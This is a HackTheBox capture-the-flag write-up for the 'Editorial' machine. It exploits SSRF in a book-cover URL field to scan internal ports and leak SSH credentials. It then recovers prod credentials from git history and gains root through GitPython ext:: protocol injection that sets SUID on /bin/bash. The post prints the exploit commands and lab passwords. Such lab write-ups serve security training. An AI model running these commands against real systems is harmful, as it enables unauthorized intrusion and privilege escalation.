---
title: "HTB: Editorial"
date: 2026-05-22
draft: true
tags:
  - htb
  - linux
  - medium
  - web
  - ssrf
  - nginx
  - burpsuite
  - sudo-abuse
  - suid
  - credential-reuse
  - write-up
description: "SSRF on a book publishing platform leaks an internal API running on port 5000. The API exposes hardcoded dev credentials, landing us a shell. From there, git history reveals prod credentials, and a sudo-allowed GitPython script is vulnerable to ext:: protocol injection — setting SUID on bash and giving us root."
ShowToc: true
cover:
  image: "/images/htb-editorial/cover.png"
  alt: "HTB Editorial machine cover"
---

Another medium box that starts with just a web form and ends with a root shell through a surprisingly elegant chain. Editorial is all about knowing what to look for — and what to ask the server to fetch for you.

## Machine Info

| Field      | Value                        |
|------------|------------------------------|
| Name       | Editorial                    |
| Platform   | HackTheBox                   |
| OS         | Linux                        |
| Difficulty | Medium                       |
| IP         | 10.129.1.101                 |

## TL;DR

SSRF on the book cover URL field → internal API on port 5000 → `/api/latest/metadata/messages/authors` leaks SSH creds for `dev` → git history in `~/apps` reveals `prod` credentials → `prod` can run a GitPython clone script as root → `ext::` protocol injection sets SUID on `/bin/bash` → root.

---

## Recon

Standard nmap to start:

```bash
nmap -sCV -p- --min-rate 5000 -oN nmap/editorial 10.129.1.101
```

{{< figure src="/images/htb-editorial/nmap.png" alt="nmap scan showing ports 22 SSH and 80 HTTP nginx with title Editorial Tiempo Arriba" >}}

Two ports: SSH on 22 and nginx on 80. The HTTP title is "Editorial Tiempo Arriba" — a book publishing site. Nothing unusual on SSH, so let's hit the web app.

---

## Enumeration

The site presents a publishing platform where authors can submit their books. The interesting part is the "Publish with us" section at `/upload`:

{{< figure src="/images/htb-editorial/upload-form.png" alt="Editorial Tiempo Arriba upload page with book cover URL field and file browse button" >}}

There's a form that accepts a **Cover URL** for the book — you enter a URL and the server fetches it to use as the cover image. That's a classic SSRF setup.

### Confirming SSRF

To verify the server actually makes outbound requests, I spun up a quick Python HTTP server and pointed the cover URL at my machine:

{{< figure src="/images/htb-editorial/ssrf-test.png" alt="Book information form with http://10.10.14.2:80 entered as the cover URL" >}}

{{< figure src="/images/htb-editorial/ssrf-confirmed.png" alt="Python HTTP server receiving GET request from 10.129.1.101 confirming SSRF" >}}

The server fetched it. SSRF confirmed.

### Internal Port Scan via SSRF

Now the real question: what's running internally? I used Burp Intruder to scan all ports by pointing the bookurl parameter at `http://127.0.0.1:§port§` with a simple list of ports 0-65535:

{{< figure src="/images/htb-editorial/burp-intruder-setup.png" alt="Burp Suite Intruder configured with bookurl pointing to 127.0.0.1 with port as payload position" >}}

After the scan, filtering by response length makes the outliers pop immediately:

{{< figure src="/images/htb-editorial/burp-intruder-results.png" alt="Burp Intruder results showing port 80 with response length 18158 and port 5000 with 222, standing out from the baseline 128" >}}

Port 80 is just the web app itself (huge response). But port **5000** stands out with a distinctly different length — something is listening there that isn't the main site.

---

## Foothold

### Probing the Internal API

When I sent the SSRF to `http://127.0.0.1:5000`, instead of rendering an image the server returned a file path:

{{< figure src="/images/htb-editorial/ssrf-port5000-response.png" alt="Burp response showing static/uploads/6d12be3b-daf9-4ffd-9ae9-dcbdec7ce54d as the served file path" >}}

The server fetched whatever was at port 5000 and saved it as a static upload. Downloading that file revealed a JSON blob listing all available API endpoints:

{{< figure src="/images/htb-editorial/api-endpoints.png" alt="Mousepad showing JSON with internal API endpoints including messages/promos, coupons, new_authors, messages/authors, platform_use, changelog, and latest metadata" >}}

Quite a few routes. The one that jumped out immediately: `/api/latest/metadata/messages/authors` — described as "Retrieve the welcome message sended to our new authors." That sounds like it might contain credentials.

### Leaking Credentials

Same trick — SSRF to `http://127.0.0.1:5000/api/latest/metadata/messages/authors`:

{{< figure src="/images/htb-editorial/ssrf-authors-response.png" alt="Burp response returning a new static uploads path for the authors message file" >}}

Download the file:

{{< figure src="/images/htb-editorial/dev-credentials.png" alt="Mousepad showing welcome message template with credentials Username: dev and Password: dev080217_devAPI!@" >}}

There it is — a welcome message template with hardcoded credentials:

```
Username: dev
Password: dev080217_devAPI!@
```

### SSH as dev

```bash
ssh dev@editorial.htb
```

{{< figure src="/images/htb-editorial/ssh-dev.png" alt="Successful SSH login as dev to editorial.htb showing Ubuntu 22.04 banner" >}}

We're in.

---

## Post-Exploitation

### User Flag

```bash
ls -la
cat user.txt
```

{{< figure src="/images/htb-editorial/user-flag.png" alt="ls -la output showing home directory with apps folder and cat user.txt revealing the user flag" >}}

Note the `apps` directory sitting there. Also notice `.bash_history` is symlinked to `/dev/null` — someone's been careful. That makes the `apps` directory more interesting.

---

## Privilege Escalation

### Git History in ~/apps

```bash
cd apps && ls -la
```

{{< figure src="/images/htb-editorial/apps-git.png" alt="ls -la in apps directory showing only a .git folder, no source files" >}}

Just a `.git` folder — no source files at all. That's suspicious. Let's check the status:

{{< figure src="/images/htb-editorial/git-status.png" alt="git status showing app_api/app.py and app_editorial/app.py as deleted files" >}}

Two Python files were deleted from the repo: `app_api/app.py` and `app_editorial/app.py`. But the git history is still intact — and that's where the good stuff hides.

```bash
git log
```

{{< figure src="/images/htb-editorial/git-log.png" alt="git log showing multiple commits, including 'change(api): downgrading prod to dev' and 'feat: create api to editorial info'" >}}

One commit title stands out: `change(api): downgrading prod to dev`. That suggests credentials were changed at some point. Let's diff that commit against the one before it:

```bash
git diff 1e84a036b2f33c59e2390730699a488c65643d28
```

{{< figure src="/images/htb-editorial/git-diff-creds.png" alt="git diff showing old code with prod credentials Username: prod Password: 080217_Producti0n_2023!@ replaced by dev credentials" >}}

The old version of `app.py` had a hardcoded prod password: `080217_Producti0n_2023!@`. That's credential reuse waiting to happen.

### Pivoting to prod

```bash
su prod
# password: 080217_Producti0n_2023!@
whoami
```

{{< figure src="/images/htb-editorial/su-prod.png" alt="su prod succeeding and whoami returning prod" >}}

### sudo -l

```bash
sudo -l
```

{{< figure src="/images/htb-editorial/sudo-l.png" alt="sudo -l showing prod can run /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py as root with wildcard argument" >}}

`prod` can run one specific Python script as root — `/opt/internal_apps/clone_changes/clone_prod_change.py` — with any argument (`*`). Let's read it:

{{< figure src="/images/htb-editorial/clone-script.png" alt="clone_prod_change.py source showing it takes a URL argument and calls GitPython Repo.clone_from with protocol.ext.allow=always" >}}

The script takes a URL as its first argument and calls GitPython's `Repo.clone_from()` with `-c protocol.ext.allow=always`. That flag is the key — it enables git's `ext::` protocol, which allows git to execute an arbitrary command as the transport layer.

### GitPython ext:: Protocol Injection

The `ext::` protocol works like this: `ext::cmd arg1 arg2` tells git to spawn `cmd arg1 arg2` and use its stdin/stdout as the git transport. Since the script runs as root, whatever we point it at gets executed as root.

The plan: write a small shell script that sets SUID on `/bin/bash`, then pass it as the ext:: target.

```bash
echo '#!/bin/bash' > /tmp/pwn.sh
echo 'chmod +s /bin/bash' >> /tmp/pwn.sh
chmod +x /tmp/pwn.sh
```

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::/tmp/pwn.sh'
```

{{< figure src="/images/htb-editorial/gitpython-exploit.png" alt="Running the clone script with ext:: payload, git errors about remote repository but the command executes" >}}

Git complains that it can't read from the remote repository — that's expected, because our script doesn't speak the git protocol. But it doesn't matter: the script already ran as root before git checked the response.

Verify:

{{< figure src="/images/htb-editorial/bash-suid.png" alt="ls -la /bin/bash showing -rwsr-sr-x confirming SUID bit is set" >}}

`/bin/bash` is now SUID. Drop into a privileged shell:

```bash
/bin/bash -p
```

{{< figure src="/images/htb-editorial/root-flag.png" alt="bash -p giving euid=0 root shell, id shows euid=0, whoami shows root, cat /root/root.txt reveals the root flag" >}}

`euid=0`. Root.

---

## Takeaways

- **SSRF as a port scanner**: when a server fetches user-supplied URLs, you can use it to map internal services that aren't exposed externally. The response length difference in Burp Intruder is the tell.
- **Git history never lies**: deleted files are gone, but commits aren't. Always check `git log` and `git diff` on interesting repos — especially ones that mention "downgrading" in their commit messages.
- **GitPython + `protocol.ext.allow=always` = RCE**: GitPython's `clone_from` passes options directly to git. If you can control the URL and ext:: is allowed, you have arbitrary code execution. This is CVE-2022-24439.

---

## References

- [GitPython RCE - CVE-2022-24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)
- [Git ext:: protocol documentation](https://git-scm.com/docs/git-remote-ext)
- [HackTheBox - Editorial](https://app.hackthebox.com/machines/Editorial)
